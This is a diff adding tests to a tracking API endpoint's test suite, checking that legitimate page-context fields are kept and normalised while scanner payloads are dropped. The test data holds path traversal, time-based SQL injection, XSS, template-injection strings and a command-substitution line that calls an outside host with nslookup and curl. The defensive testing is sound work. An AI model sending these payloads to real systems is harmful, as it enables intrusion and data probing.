@@ -130,9 +130,62 @@ describe("POST /api/tool-usage/track", () => {
     expect(event.userKey).toBe("unknown");
   });
 
-  it("drops an action that is not a plain identifier", async () => {
+  it("drops an action that is not a known action", async () => {
     await POST(track({ toolName: "AI Tutor", action: "../../etc/shells" }));
     expect((await storedEvent()).action).toBe("generate");
+  });
+
+  it("keeps well-formed page context from a real browser", async () => {
+    await POST(
+      track({
+        toolName: "AI Tutor",
+        action: "flashcards",
+        path: "/tools/study-workspace/",
+        search: "?utm_source=facebook&utm_campaign=Spring Sale | US (Broad)&fbclid=IwAR3xY_z-9&session=abc",
+        referrer: "https://www.google.com/search?q=essay+help",
+        timezone: "Asia/Calcutta",
+        language: "en-us",
+        device: "mobile",
+      }),
+    );
+    expect(await storedEvent()).toMatchObject({
+      action: "flashcards",
+      path: "/tools/study-workspace/",
+      search: "?utm_source=facebook&utm_campaign=Spring+Sale+%7C+US+%28Broad%29&fbclid=IwAR3xY_z-9",
+      referrer: "https://www.google.com",
+      timezone: "Asia/Calcutta",
+      language: "en-US",
+      device: "mobile",
+    });
+  });
+
+  it("drops page context fields that carry scanner payloads", async () => {
+    await POST(
+      track({
+        toolName: "Paraphraser Tool",
+        path: "../../../../etc/shells",
+        search: "?utm_source=1-1 waitfor delay '0:0:15' --&utm_medium=(select 198766*667891)",
+        href: "https://scholarlyhelp.com/tools/'\"><script>",
+        referrer: "$(nslookup -q=cname hit.bxss.me||curl hit.bxss.me)",
+        timezone: "Europe/Berlin' OR 19=(SELECT 19 FROM PG_SLEEP(15))--",
+        language: "en-US'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),15)||'",
+        device: "${@print(md5(31337))}",
+      }),
+    );
+    const event = await storedEvent();
+    for (const field of ["path", "search", "href", "referrer", "timezone", "language", "device"]) {
+      expect(event[field], field).toBeUndefined();
+    }
+  });
+
+  it("stores only the referring origin, never its path or query", async () => {
+    await POST(
+      track({
+        toolName: "Paraphraser Tool",
+        referrer: "https://scholarlyhelp.com/about-us/' OR 42=(SELECT 42 FROM PG_SLEEP(15))--",
+      }),
+    );
+    expect((await storedEvent()).referrer).toBe("https://scholarlyhelp.com");
   });
 
   it("ignores client-sent geo headers and uses the server-side lookup", async () => {
